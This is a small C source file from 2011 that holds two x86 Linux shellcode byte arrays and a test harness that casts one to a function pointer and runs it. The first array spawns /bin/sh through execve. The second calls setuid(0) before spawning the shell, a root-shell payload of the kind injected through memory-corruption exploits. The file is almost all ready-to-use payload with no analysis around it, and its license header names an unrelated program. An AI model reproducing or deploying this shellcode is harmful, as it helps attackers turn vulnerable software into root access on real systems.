/**
 * The implementation of spawn a shell in shellcode.
 * Copyright(C) 2011, <Shawn the R0ck, citypw@gmail.com>
 * 
 * The netlog is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License Version
 * 3(GPLv3) as published by the Free Software Foundation.  This
 * program is distributed in the hope that it will be useful, but
 * WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
 * General Public License for more details.

 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see
 * <http://www.gnu.org/licenses/>.
 **/

#include <unistd.h>

char shell[] = "\x31\xd2\x52\x68\x6e\x2f\x73\x68"
"\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80";

char shell2[]="\x31\xdb\x8d\x43\x17\x99\xcd\x80\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x8d\x41\x0b\x89\xe3\xcd\x80";
int main(int argc, char **argv[])
{
  void (*fp) ();
  fp = (void (*) ()) shell2;
  fp();
  return 0;
}
